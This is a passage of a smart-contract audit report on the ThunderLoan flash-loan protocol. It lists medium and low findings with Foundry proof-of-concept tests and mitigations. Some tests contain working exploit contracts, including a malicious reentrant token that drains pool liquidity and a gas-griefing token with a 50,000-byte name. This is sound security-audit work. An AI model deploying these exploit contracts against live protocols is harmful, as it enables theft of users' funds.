        // attacker captures at least 99 % of the fee
        assertGt(profit, fee * 99 / 100, "attacker should capture nearly all the fee");
    }
}

## Suggested Mitigation
Decouple the share price calculation from the instantaneous total supply. A more robust method is to track liquidity inflows and outflows separately from fee accrual. When a user deposits, mint shares proportional to their deposit relative to the current total underlying assets (including accrued fees). This prevents manipulation because the value of existing shares is calculated based on the total assets, which cannot be temporarily diluted in the same way the share count can.
Alternatively, implement slippage controls on deposits and withdrawals to protect users from sudden, unexpected changes in the exchange rate.

## [M-18]. Storage Layout issue in ThunderLoan::NA

## Description
The upgradeable contracts `ThunderLoan` and `ThunderLoanUpgraded` do not include a storage gap (e.g., `uint256[50] private __gap;`) at the end of their state variable declarations. This is a crucial safety feature for upgradeable contracts, as recommended by OpenZeppelin, to accommodate new state variables in future versions without causing storage layout collisions.

## Impact
If a future version of this contract adds new state variables, and a parent contract is also upgraded to include new variables, their storage slots could collide. This would lead to state corruption, where one variable overwrites another, breaking contract logic and potentially leading to catastrophic failures or exploits.

## Proof of Concept
This is a latent issue that manifests during future upgrades. A conceptual scenario:
1. `ThunderLoan` v1 is deployed.
2. A new version of the parent `OwnableUpgradeable` contract is released which adds one new state variable.
3. A developer creates `ThunderLoan` v2, which also adds one new state variable. They inherit the new `OwnableUpgradeable`.
4. When upgrading the proxy from v1 to v2, the new variable in `ThunderLoan` v2 will be assigned storage slot X. The new variable in the updated parent contract will also be assigned slot X, causing a collision and corrupting the contract's state.

## Proof of Code
NA

## Suggested Mitigation
Add a `uint256[50] private __gap;` (or similar size) at the end of every upgradeable contract that declares storage — including OracleUpgradeable, ThunderLoan and ThunderLoanUpgraded — so that future versions can safely insert new variables without colliding with existing storage.

## [M-19]. Reentrancy issue in ThunderLoan::flashloan

## Description
The `flashloan` function violates the Checks-Effects-Interactions pattern. It changes state (`s_currentlyFlashLoaning[token] = false;`) after an external call to the receiver but before another external call within the `repay` function. If the underlying token is a malicious contract with a re-entrancy hook in its `transferFrom` function, an attacker can re-enter the `flashloan` function after the re-entrancy guard has been disabled but before the initial loan is repaid, allowing them to drain all liquidity for that token from the protocol.

Vulnerable Code (`ThunderLoan.sol`):
```solidity
function flashloan(address receiver, IERC20 token, uint256 amount, bytes calldata data) external {
    // ... checks and initial state change
    s_currentlyFlashLoaning[token] = true;
    // ...
    // External call to receiver
    IFlashLoanReceiver(receiver).executeOperation(address(token), amount, fee, msg.sender, data);
    
    // State change AFTER external call - unsafe pattern
    s_currentlyFlashLoaning[token] = false;
    
    // A subsequent call that can be hijacked for re-entrancy
    repay(token, amount + fee);
}
```
Note: This attack is currently blocked by a separate bug where the `repay` call inside `flashloan` always reverts due to an incorrect `msg.sender`. However, a vulnerability that is only protected by another bug is still a critical vulnerability.

## Impact
An attacker can drain all liquidity of a whitelisted malicious ERC-20 by re-entering flashloan once the internal re-entrancy flag is cleared but before repayment accounting is completed. This requires (i) the owner to have listed the attacker’s token or another token that contains a malicious hook and (ii) sufficient liquidity of that token in the protocol. Assets of other tokens remain safe.

## Proof of Concept
1. An attacker deploys a malicious ERC20 token (`ReentrantToken`) whose `transferFrom` function calls back into `ThunderLoan.flashloan`.
2. The attacker also deploys a simple `Receiver` contract.
3. The attacker provides some initial liquidity for `ReentrantToken` in `ThunderLoan` or convinces the owner to list it.
4. The attacker calls `ThunderLoan.flashloan` with `ReentrantToken`.
5. The `flashloan` function calls `Receiver.executeOperation`, which simply returns.
6. `ThunderLoan` sets `s_currentlyFlashLoaning[ReentrantToken]` to `false`.
7. `ThunderLoan` then calls `repay`, which in turn calls `ReentrantToken.transferFrom`.
8. The malicious `transferFrom` function re-enters `ThunderLoan.flashloan`. Since the re-entrancy guard is now `false`, the call succeeds.
9. The attacker is granted a second flash loan. This process can be repeated until the contract is drained of `ReentrantToken`.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// A modified ThunderLoan where the repay logic is fixed to make the PoC possible.
contract PatchedThunderLoan is ThunderLoan {
    function repay(IERC20 token, uint256 amount, address borrower) public {
        require(isAllowedToken[token], "ThunderLoan: Token not allowed");
        token.transferFrom(borrower, address(this), amount);
    }

    function flashloan(address receiver, IERC20 token, uint256 amount, bytes calldata data) external {
        uint256 fee = getCalculatedFee(token, amount);
        if (s_currentlyFlashLoaning[token]) {
            revert ThunderLoan__FlashLoaning();
        }
        if (amount > token.balanceOf(address(getAssetFromToken(token)))) {
            revert ThunderLoan__NotEnoughLiquidity();
        }

        s_currentlyFlashLoaning[token] = true;
        getAssetFromToken(token).transferUnderlyingTo(receiver, amount);
        IFlashLoanReceiver(receiver).executeOperation(address(token), amount, fee, msg.sender, data);
        s_currentlyFlashLoaning[token] = false; // Unsafe pattern
        repay(token, amount + fee, msg.sender); // Patched to use correct borrower
    }
}

contract ReentrantToken is ERC20 {
    address public attacker;
    PatchedThunderLoan public thunderLoan;

    constructor() ERC20("Reentrant Token", "RTKN") {
        attacker = msg.sender;
        _mint(msg.sender, 1_000_000e18);
    }

    function setLoanContract(address loanContract) external {
        thunderLoan = PatchedThunderLoan(loanContract);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        if (msg.sender == address(thunderLoan)) { // Re-entrancy trigger
            if (thunderLoan.isAllowedToken(IERC20(this))) { // prevent infinite loop
                 uint256 balance = this.balanceOf(address(thunderLoan.getAssetFromToken(IERC20(this))));
                 if (balance > 1) {
                    // Drain remaining balance
                    thunderLoan.flashloan(attacker, IERC20(this), balance - 1, "");
                 }
            }
        }
        _transfer(from, to, amount);
        return true;
    }
}

contract ReentrancyTest is Test, IFlashLoanReceiver {
    PatchedThunderLoan internal loan;
    ReentrantToken internal rToken;
    address internal attacker = makeAddr("attacker");

    function executeOperation(address, uint256, uint256, address, bytes calldata) external override returns (bool) {
        return true;
    }

    function setUp() public {
        loan = new PatchedThunderLoan();
        loan.initialize(address(0));
        
        vm.prank(attacker);
        rToken = new ReentrantToken();
        rToken.setLoanContract(address(loan));

        loan.setAllowedToken(IERC20(rToken), true);

        // Provide liquidity
        vm.prank(attacker);
        rToken.approve(address(loan), 100e18);
        loan.deposit(IERC20(rToken), 100e18);
    }

    function test_ReentrancyFlashloanDrain() public {
        uint256 initialAttackerBalance = rToken.balanceOf(attacker);
        uint256 contractLiquidity = rToken.balanceOf(address(loan.getAssetFromToken(IERC20(rToken))));
        console.log("Initial Contract Liquidity:", contractLiquidity);

        vm.startPrank(attacker);
        rToken.approve(address(loan), 1e18);
        // Attacker calls flashloan
        loan.flashloan(address(this), IERC20(rToken), 10e18, "");
        vm.stopPrank();

        uint256 finalContractLiquidity = rToken.balanceOf(address(loan.getAssetFromToken(IERC20(rToken))));
        uint256 finalAttackerBalance = rToken.balanceOf(attacker);

        console.log("Final Contract Liquidity:", finalContractLiquidity);
        console.log("Attacker Balance Change:", finalAttackerBalance - initialAttackerBalance);

        // Attacker drained almost all funds, leaving 1 wei due to the check
        assertTrue(finalContractLiquidity <= 1, "Contract should be drained");
    }
}
```

## Suggested Mitigation
The contract should not modify state after an external call. The check for repayment should be done by verifying balances, and the re-entrancy guard should be unset at the very end of the function. A safer pattern is to record the balance before the loan, perform the loan, and then verify that the contract's balance has increased by the required fee amount after the loan completes.

```solidity
// A safer flashloan implementation
function flashloan(address receiver, IERC20 token, uint256 amount, bytes calldata data) external {
    // ... initial checks
    s_currentlyFlashLoaning[token] = true;

    AssetToken assetToken = getAssetFromToken(token);
    uint256 balanceBefore = token.balanceOf(address(assetToken));
    uint256 fee = getCalculatedFee(token, amount);
    
    // Transfer funds and call receiver
    assetToken.transferUnderlyingTo(receiver, amount);
    IFlashLoanReceiver(receiver).executeOperation(address(token), amount, fee, msg.sender, data);
    
    // Check for repayment
    uint256 balanceAfter = token.balanceOf(address(assetToken));
    if (balanceAfter < balanceBefore + fee) {
        revert ThunderLoan__RepayFailed();
    }

    // Update exchange rate with the earned fee
    assetToken.updateExchangeRate(fee);

    s_currentlyFlashLoaning[token] = false;
    emit FlashLoaned(receiver, address(token), amount, fee);
}
```
This requires the `IFlashLoanReceiver` to transfer the `amount + fee` back to the `AssetToken` contract, which is a more standard and secure flash loan pattern.



# Low Risk Findings

## [L-1]. DOS issue in AssetToken::updateExchangeRate

## Description
The `AssetToken.updateExchangeRate` function calculates a new rate with the formula `s_exchangeRate * (totalSupply() + fee) / totalSupply()`. This function is called by `ThunderLoan.flashloan`. The flashloan logic correctly checks if the underlying token balance is sufficient, but it does not require any `AssetToken`s to have been minted. If a pool has liquidity (e.g., from a direct transfer to the `AssetToken` contract) but has a `totalSupply()` of zero, any attempt to take a flash loan will cause a division-by-zero revert, making flash loans for that asset permanently unavailable until a deposit is made via the `deposit` function.

## Impact
This creates a Denial of Service (DoS) vector for the flash loan functionality of any given token pool. Users will be unable to take flash loans from a pool that has underlying assets but no minted `AssetToken`s, breaking a core feature of the protocol for that asset.

## Proof of Concept
1. The owner calls `setAllowedToken` to list a new token, creating an `AssetToken` contract for it.
2. A user, or the protocol itself, transfers a large amount of the underlying token directly to the `AssetToken` contract address. The `AssetToken` now has a balance to lend, but its `totalSupply` is zero.
3. A borrower attempts to take a flash loan of these tokens by calling `ThunderLoan.flashloan`.
4. The `flashloan` function calls `assetToken.updateExchangeRate(fee)` before lending the tokens.
5. The call to `updateExchangeRate` reverts with a division-by-zero error because `totalSupply()` is 0.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {FlashLoanReceiver} from "./mocks/FlashLoanReceiver.sol";

// Using Mocks from previous PoC
contract MockTSwapPoolDos is Test {
    function getPriceOfOnePoolTokenInWeth() external pure returns (uint256) { return 1e18; }
}
contract MockPoolFactoryDos is Test {
    mapping(address => address) public pools;
    function addPool(address token, address pool) external { pools[token] = pool; }
    function getPool(address token) external view returns (address) { return pools[token]; }
}

contract DivisionByZeroTest is Test {
    ThunderLoan internal thunderLoan;
    MockERC20 internal weth;
    AssetToken internal assetToken;

    address internal owner = makeAddr("owner");
    address internal user = makeAddr("user");

    function setUp() public {
        vm.prank(owner);
        ThunderLoan implementation = new ThunderLoan();

        MockPoolFactoryDos poolFactory = new MockPoolFactoryDos();
        MockTSwapPoolDos tSwapPool = new MockTSwapPoolDos();
        weth = new MockERC20("Wrapped Ether", "WETH", 18);
        poolFactory.addPool(address(weth), address(tSwapPool));

        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(poolFactory));
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), data);
        thunderLoan = ThunderLoan(address(proxy));

        vm.prank(owner);
        thunderLoan.setAllowedToken(weth, true);
        assetToken = thunderLoan.getAssetFromToken(weth);
    }

    function test_DoS_divisionByZeroInFlashloan() public {
        // 1. Provide liquidity directly to AssetToken contract, bypassing deposit()
        uint256 directLiquidity = 100 ether;
        weth.mint(user, directLiquidity);
        vm.prank(user);
        weth.transfer(address(assetToken), directLiquidity);

        // AssetToken has funds, but no shares have been minted
        assertEq(weth.balanceOf(address(assetToken)), directLiquidity);
        assertEq(assetToken.totalSupply(), 0);

        // 2. Attempt to take a flash loan
        FlashLoanReceiver flashLoanReceiver = new FlashLoanReceiver(address(thunderLoan), weth);
        uint256 flashLoanAmount = 50 ether;
        bytes memory params = abi.encode(flashLoanAmount);

        // Expect a revert due to division by zero
        vm.expectRevert(); // Catches arithmetic overflow/underflow, including division by zero
        vm.prank(user);
        thunderLoan.flashloan(address(flashLoanReceiver), weth, flashLoanAmount, params);
    }
}
```

## Suggested Mitigation
In the `AssetToken.updateExchangeRate` function, add a check to ensure `totalSupply()` is not zero before performing the division. If there is no supply, there are no LPs to distribute fees to, so the exchange rate update can be safely skipped.

```solidity
// In AssetToken.sol -> updateExchangeRate function
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    if (totalSupply() == 0) {
        return; // No LPs to distribute fees to, so no rate update
    }
    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;

    emit ExchangeRateUpdated(s_exchangeRate);
}
```

## [L-2]. Gas Grief BlockLimit issue in ThunderLoan::setAllowedToken

## Description
The owner-only `setAllowedToken` function creates a new `AssetToken` contract. The name and symbol for this new token are created by concatenating a prefix with the name and symbol from the user-provided underlying token contract. A malicious user could create an ERC20 token with an extremely long name or symbol. If the owner is tricked into allowing this token, the `string.concat` operation would consume a very large amount of gas, potentially exceeding the block gas limit and causing the transaction to fail. This is a gas griefing/DoS attack vector against an administrative function.

## Impact
An attacker can prevent the owner from adding new tokens by tricking them into calling `setAllowedToken` with a malicious token. The transaction would fail, but the owner would still pay for the gas consumed up to the point of failure. This disrupts the administration and expansion of the protocol.

## Proof of Concept
contract MaliciousLongNameToken is IERC20Metadata {
    /* --- only the functions actually used by ThunderLoan are implemented --- */
    function name() external pure override returns (string memory) {
        // return a 50 000-byte string (≈ 50 KB)
        bytes memory str = new bytes(50000);
        for (uint256 i; i < 50000; ++i) {
            str[i] = bytes1(uint8(0x61)); // "a"
        }
        return string(str);
    }

    function symbol() external pure override returns (string memory) {
        return "MAL";
    }

    function decimals() external pure override returns (uint8) { return 18; }

    /* --- dummy implementations to satisfy the rest of IERC20 --- */
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return false; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return false; }
}

## Proof of Code
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../../src/protocol/ThunderLoan.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IPoolFactory} from "../../src/interfaces/IPoolFactory.sol";

/* ─────────────────────────────────  Helpers  ─────────────────────────────── */
contract DummyPoolFactory is IPoolFactory {
    function getPool(address) external pure returns (address) { return address(0); }
}

contract MaliciousLongNameToken is IERC20Metadata {
    function name() external pure override returns (string memory) {
        bytes memory str = new bytes(50000);
        for (uint256 i; i < 50000; ++i) str[i] = bytes1(uint8(0x61));
        return string(str);
    }
    function symbol() external pure override returns (string memory) { return "MAL"; }
    function decimals() external pure override returns (uint8) { return 18; }
    /* IERC20 no-ops */
    function totalSupply() external pure returns (uint256) { return 0; }
    function balanceOf(address) external pure returns (uint256) { return 0; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
    function allowance(address, address) external pure returns (uint256) { return 0; }
    function approve(address, uint256) external pure returns (bool) { return false; }
    function transferFrom(address, address, uint256) external pure returns (bool) { return false; }
}

contract GasGriefingTest is Test {
    ThunderLoan private loan;
    address private owner = address(0xABCD);

    function setUp() public {
        vm.startPrank(owner);
        ThunderLoan impl = new ThunderLoan();
        bytes memory init = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(new DummyPoolFactory()));
        ERC1967Proxy proxy = new ERC1967Proxy(address(impl), init);
        loan = ThunderLoan(address(proxy));
        vm.stopPrank();
    }

    function test_setAllowedToken_reverts_with_OOG() public {
        MaliciousLongNameToken mal = new MaliciousLongNameToken();
        vm.startPrank(owner);
        // Supply only 5M gas – well below the >20M needed for copying a 50KB string
        vm.expectRevert();
        loan.setAllowedToken{gas: 5_000_000}(IERC20(address(mal)), true);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Before concatenating, bound-check the length of `IERC20Metadata.name()` and `symbol()`. For example:

```solidity
string memory n = IERC20Metadata(address(token)).name();
string memory s = IERC20Metadata(address(token)).symbol();
require(bytes(n).length <= 64 && bytes(s).length <= 16, "ThunderLoan: name/symbol too long");
```

## [L-3]. Pausable Emergency Stop issue in ThunderLoan::NA

## Description
The protocol does not have a global emergency stop (pause) mechanism. In the event of a critical vulnerability discovery, the owner's only recourse is to disable affected token pools one by one via `setAllowedToken(token, false)`. This process is slow, requires multiple transactions, and creates a window of opportunity for attackers to exploit the vulnerability on still-active pools. A global pause function would allow the owner to halt all critical functions (`deposit`, `redeem`, `flashloan`) in a single transaction, providing a much more effective incident response.

## Impact
In the case of a critical bug, the inability to swiftly pause the protocol can lead to a partial or total loss of user funds. The delay in disabling pools individually creates a race condition between the owner and attackers.

## Proof of Concept
1. A critical bug is found in the `redeem` function that allows users to withdraw more funds than they deposited.
2. The protocol has 10 active token pools.
3. An attacker creates 10 bots, one for each pool, and starts draining funds.
4. The owner is notified and starts calling `setAllowedToken(token, false)` for each pool. Each transaction takes time to be mined.
5. While the owner is disabling the first few pools, the attacker's bots continue to drain funds from the remaining active pools.
6. A significant amount of funds is stolen before the owner can disable all 10 pools. A single `pause()` transaction would have prevented this.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";

// This PoC is conceptual and describes the scenario. A code PoC would require
// simulating a vulnerability and a race condition, which is complex.
// The core of the finding is the *absence* of a feature, not an exploitable bug in existing code.

contract PausableTest is Test {
    function test_conceptual_lackOfPause() public {
        // SCENARIO:
        // 1. Assume a bug in ThunderLoan.redeem() allows withdrawing more than deposited.
        // 2. The protocol has two active pools: WETH and DAI.
        // 3. Attacker starts draining both pools.

        // address owner = ...;
        // ThunderLoan thunderLoan = ...;
        // IERC20 weth = ...;
        // IERC20 dai = ...;

        // Owner must submit two separate transactions to stop the drain.
        // Tx 1: vm.prank(owner); thunderLoan.setAllowedToken(weth, false);
        // -- DRAIN CONTINUES ON DAI POOL WHILE TX 1 IS MINING --

        // Tx 2: vm.prank(owner); thunderLoan.setAllowedToken(dai, false);
        // -- DRAIN ON WETH IS STOPPED, DRAIN ON DAI STOPS AFTER TX 2 IS MINED --

        // If a pause function existed:
        // vm.prank(owner); thunderLoan.pause();
        // -- ALL ACTIVITY ON ALL POOLS STOPS AFTER ONE TRANSACTION --

        assertTrue(true, "Conceptual PoC: Lack of a global pause function creates a race condition during incident response.");
    }
}
```

## Suggested Mitigation
Integrate OpenZeppelin's `PausableUpgradeable` contract to add a global pause mechanism. Apply the `whenNotPaused` modifier to all critical functions that involve fund movements or state changes initiated by non-admin users.

```solidity
// In ThunderLoan.sol
import "@openzeppelin/contracts-upgradeable/security/PausableUpgradeable.sol";

contract ThunderLoan is Initializable, UUPSUpgradeable, OwnableUpgradeable, ContextUpgradeable, OracleUpgradeable, PausableUpgradeable {
    // ... existing code ...

    function initialize(address tswapAddress) public override initializer {
        // ... existing initializers ...
        __Pausable_init();
    }

    function pause() external onlyOwner {
        _pause();
    }

    function unpause() external onlyOwner {
        _unpause();
    }

    function deposit(IERC20 token, uint256 amount) external override whenNotPaused /* ... */ {
        // ...
    }

    function redeem(IERC20 token, uint256 amountOfAssetToken) external override whenNotPaused /* ... */ {
        // ...
    }

    function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external override whenNotPaused /* ... */ {
        // ...
    }
}
```

## [L-4]. Integer Overflow/Math issue in ThunderLoan::deposit

## Description
The `deposit` function calculates the amount of `AssetToken` to mint based on the deposited amount and the current exchange rate. Due to integer division, if a user deposits a small `amount` of an underlying token when the `exchangeRate` is high, the calculated `mintAmount` can round down to zero. The function proceeds to transfer the user's tokens but mints no `AssetToken`s in return, causing a complete loss of the deposited funds for that user. The funds are effectively donated to the other liquidity providers in the pool.

Vulnerable Code Snippet in `ThunderLoan.sol`:
```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
    // ...
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 exchangeRate = assetToken.getExchangeRate();
    uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;

    emit Deposit(msg.sender, token, amount);

    assetToken.mint(msg.sender, mintAmount); // mintAmount can be 0
    // ...
    token.safeTransferFrom(msg.sender, address(assetToken), amount); // User's funds are transferred regardless
}
```

## Impact
A user who deposits an amount smaller than EXCHANGE_RATE_PRECISION / currentExchangeRate will have all of his tokens transferred to the pool while receiving zero AssetTokens. The loss is limited to the user’s own deposit and does not threaten existing liquidity, but it represents an unexpected, irreversible donation to the pool.

## Proof of Concept
1. Initial LP deposits 1_000 ether of WETH.
2. We impersonate the ThunderLoan contract in the test and call `updateExchangeRate` with a fee equal to the current totalSupply (1_000 ether).  Exchange-rate doubles from 1e18 to 2e18.
3. A victim deposits 1 wei of WETH.
4. Because 1 * 1e18 / 2e18 == 0, no AssetTokens are minted while the wei is transferred to the pool.
5. Victim’s WETH decreases, AssetToken balance stays zero; pool balance increases by 1 wei.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {MockTSwapPool} from "./mocks/MockTSwapPool.sol";
import {MockPoolFactory} from "./mocks/MockPoolFactory.sol";

contract DepositRoundingTest is Test {
    ThunderLoan tl;
    MockERC20 weth;
    AssetToken aWETH;
    address owner = makeAddr("owner");
    address lp     = makeAddr("lp");
    address victim = makeAddr("victim");

    function setUp() public {
        vm.prank(owner);
        tl = new ThunderLoan();

        // mock token & price infra
        weth = new MockERC20("Wrapped Ether","WETH",18);
        MockTSwapPool pool = new MockTSwapPool();
        pool.setPrice(1e18);
        MockPoolFactory pf = new MockPoolFactory();
        pf.setPool(address(weth), address(pool));

        vm.prank(owner);
        tl.initialize(address(pf));

        // allow WETH
        vm.prank(owner);
        aWETH = AssetToken(tl.setAllowedToken(weth, true));

        // provide initial liquidity
        weth.mint(lp, 1_000 ether);
        vm.startPrank(lp);
        weth.approve(address(tl), 1_000 ether);
        tl.deposit(weth, 1_000 ether);
        vm.stopPrank();

        // simulate protocol fee so that exchange-rate doubles
        vm.prank(address(tl)); // impersonate ThunderLoan (bypasses onlyThunderLoan)
        aWETH.updateExchangeRate(1_000 ether);
        assertEq(aWETH.getExchangeRate(), 2e18, "rate doubled");
    }

    function test_RoundingDepositLosesFunds() public {
        // victim has 1 wei
        weth.mint(victim, 1);
        uint256 victimWethBefore   = weth.balanceOf(victim);
        uint256 victimAssetBefore  = aWETH.balanceOf(victim);
        uint256 poolBalanceBefore  = weth.balanceOf(address(aWETH));

        vm.startPrank(victim);
        weth.approve(address(tl), 1);
        tl.deposit(weth, 1);
        vm.stopPrank();

        assertEq(aWETH.balanceOf(victim), victimAssetBefore, "no AssetTokens minted");
        assertEq(weth.balanceOf(victim), victimWethBefore - 1, "victim WETH decreased");
        assertEq(weth.balanceOf(address(aWETH)), poolBalanceBefore + 1, "pool received tokens");
    }
}

## Suggested Mitigation
Revert the transaction when `mintAmount == 0` (e.g. `if (mintAmount == 0) revert ThunderLoan__DepositAmountTooLow();`). This guarantees that every successful deposit mints at least 1 AssetToken and avoids silent loss of funds for small deposits.

## [L-5]. Reentrancy issue in ThunderLoan::flashloan

## Description
The `ThunderLoan.flashloan` function does not implement a reentrancy guard. An attacker can make a re-entrant call to `flashloan` for the same token from within the `executeOperation` callback. The inner (re-entrant) call will complete its execution first, which includes setting `s_currentlyFlashLoaning[token]` to `false`. When control returns to the outer `flashloan` call, its state-tracking flag is already `false`, even though the loan is still active. This corrupts the protocol's state and can break other logic that depends on this flag, such as the `repay` function, which will revert if called when the flag is unexpectedly `false`.

## Impact
A borrower can nest flash-loan calls for the same token. During the outer call the `s_currentlyFlashLoaning[token]` flag is momentarily cleared by the inner call, so subsequent calls to the convenience function `repay()` (inside the same transaction) will revert with `ThunderLoan__NotCurrentlyFlashLoaning`. No funds can be stolen, lost or locked and the flag is restored to its correct value (`false`) once the outer flash-loan finishes. The impact is limited to disrupting the helper `repay()` flow within the same tx.

## Proof of Concept
1. An attacker creates a contract that implements `IFlashLoanReceiver`.
2. The attacker's contract calls `ThunderLoan.flashloan()`.
3. Inside its `executeOperation` callback, the attacker's contract calls `ThunderLoan.flashloan()` again for the same token.
4. The inner flash loan executes, and upon completion, sets `s_currentlyFlashLoaning` for the token to `false`.
5. Control returns to the outer `executeOperation` call. The `s_currentlyFlashLoaning` flag is now `false`, even though the initial loan is not yet complete. Any logic in the attacker's contract that relies on this flag (e.g., calling `repay`) will now fail.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {IPoolFactory} from "../src/interfaces/IPoolFactory.sol";
import {ITSwapPool} from "../src/interfaces/ITSwapPool.sol";

// Mocks from previous test
contract MockTSwapPool is ITSwapPool { function getPriceOfOnePoolTokenInWeth() external view override returns (uint256) {return 1e18;}}
contract MockPoolFactory is IPoolFactory { mapping(address => address) private s_pools; function setPool(address token, address pool) external { s_pools[token] = pool; } function getPool(address token) external view override returns (address) { return s_pools[token]; }}

contract ReentrancyAttacker is IFlashLoanReceiver {
    ThunderLoan public immutable i_thunderLoan;
    ERC20Mock public immutable i_token;
    bool private reentered = false;
    bool public stateWasCorrupted = false;

    constructor(ThunderLoan thunderLoan, ERC20Mock token) {
        i_thunderLoan = thunderLoan;
        i_token = token;
    }

    function attack(uint256 amount) external {
        i_thunderLoan.flashloan(address(this), IERC20(i_token), amount, "");
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address, bytes calldata) external override returns (bool) {
        if (!reentered) {
            reentered = true;

            // Re-enter flashloan
            i_thunderLoan.flashloan(address(this), IERC20(i_token), amount, "");

            // Check the state after the re-entrant call has finished.
            // The inner call sets s_currentlyFlashLoaning to false, corrupting the state for this outer call.
            if (!i_thunderLoan.isCurrentlyFlashLoaning(IERC20(i_token))) {
                stateWasCorrupted = true;
            }
        }
        
        // Repay the loan
        i_token.transfer(address(i_thunderLoan.getAssetFromToken(IERC20(i_token))), amount + fee);
        return true;
    }
}

contract ReentrancyTest is Test {
    ThunderLoan internal thunderLoan;
    ERC20Mock internal weth;

    function setUp() public {
        weth = new ERC20Mock();
        MockPoolFactory factory = new MockPoolFactory();
        MockTSwapPool pool = new MockTSwapPool();
        factory.setPool(address(weth), address(pool));
        ThunderLoan implementation = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), abi.encodeWithSelector(ThunderLoan.initialize.selector, address(factory)));
        thunderLoan = ThunderLoan(address(proxy));
        
        // Provide liquidity
        weth.mint(address(this), 1000e18);
        thunderLoan.setAllowedToken(IERC20(weth), true);
        weth.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(IERC20(weth), 1000e18);
    }

    function testReentrancy() public {
        uint256 loanAmount = 100e18;
        ReentrancyAttacker attacker = new ReentrancyAttacker(thunderLoan, weth);
        weth.mint(address(attacker), 2e18); // Provide gas funds for fees
        
        attacker.attack(loanAmount);

        assertTrue(attacker.stateWasCorrupted(), "Re-entrant call did not corrupt the s_currentlyFlashLoaning state");
    }
}
```

## Suggested Mitigation
If nested flash-loans are not a desired feature, add a check at the beginning of `flashloan` that reverts when `s_currentlyFlashLoaning[token]` is already `true` or use a simple re-entrancy guard. If nested loans must remain possible, change `s_currentlyFlashLoaning` from a bool to a uint256 counter and make `repay()` succeed when the counter is > 0.

## [L-6]. Pausable Emergency Stop issue in ThunderLoan::NA

## Description
The `ThunderLoan` contract manages user funds and critical financial operations like deposits, redemptions, and flash loans. However, it lacks a pausable or emergency stop mechanism. In the event a critical vulnerability is discovered (e.g., an inflation bug in `redeem` or a fee bypass in `flashloan`), there is no way for the owner to swiftly halt protocol activities. The only available action is a contract upgrade via the UUPS pattern, which can be a slow process involving developing, testing, and deploying a new implementation. This delay provides a window for attackers to exploit the vulnerability and drain funds.

## Impact
Lacking a circuit-breaker increases the blast-radius of any future undiscovered bug because the owner cannot halt operations while an upgrade is prepared. No funds are immediately at risk in the current code-path; the issue only amplifies damage from other yet-unknown bugs.

## Proof of Concept
1. A white-hat hacker discovers a flaw in the `redeem` function that allows a user to withdraw more underlying assets than their `AssetToken` balance should permit.
2. The hacker privately reports the issue to the protocol team.
3. Before the team can deploy an upgraded contract, a black-hat attacker independently discovers and begins to exploit the same vulnerability.
4. The protocol starts losing funds rapidly.
5. The team is unable to stop the ongoing attack because there is no `pause` function. They can only watch as funds are drained while they rush to deploy a fix.
6. If a pause mechanism existed, the owner could have immediately called `pause()` upon receiving the report, freezing all `deposit` and `redeem` activity and preventing any financial loss.

## Proof of Code
A code-based proof of concept is not applicable as this finding relates to the *absence* of a security feature. The proof is the lack of a pausable mechanism in the `ThunderLoan.sol` contract. A test could demonstrate a hypothetical exploit that would be preventable with a pause function, but the core issue is the missing code itself.

## Suggested Mitigation
